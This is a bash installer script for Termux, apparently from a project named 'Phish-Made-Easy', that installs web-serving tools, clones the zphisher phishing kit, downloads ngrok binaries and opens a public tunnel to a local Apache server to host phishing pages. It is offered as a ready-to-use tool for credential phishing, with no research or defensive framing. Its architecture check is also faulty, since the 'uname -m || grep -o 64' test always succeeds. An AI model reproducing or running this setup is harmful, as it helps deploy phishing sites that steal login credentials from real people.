#!/bin/bash

cd $HOME
pkg install git -y
pkg install wget -y
pkg install curl -y

pkg install unzip -y

pkg install apache2 -y
pkg install openssh -y
pkg install php -y

git clone https://github.com/htr-tech/zphisher.git

ngrok() {
echo -e "\e[92mPaste your authtoken here: \e[0m"
read authtoken
./ngrok authtoken $authtoken

echo -e "\e[92mTurn on your hotspot and type done\e[0m"
read confirm

while [ "$confirm" != "done" ]
do
echo -e "\e[92mTurn on your hotspot and type done\e[0m"
read confirm
done

apachectl start
./ngrok http 8080
}


uname -m || grep -o 64
# 0 means 64
if [ $? = 0 ]; then
wget https://github.com/ZechBron/Phish-Made-Easy/raw/master/ngrok-stable-linux-arm64.zip
unzip ngrok-stable-linux-arm64.zip
ngrok

# 1 means no
elif [ $? = 1 ]; then
wget https://github.com/ZechBron/Phish-Made-Easy/raw/master/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
ngrok
else
echo -e "\e[91mUnknown Error.\e[0m"
fi



https://github.com/ZechBron/Phish-Made-Easy
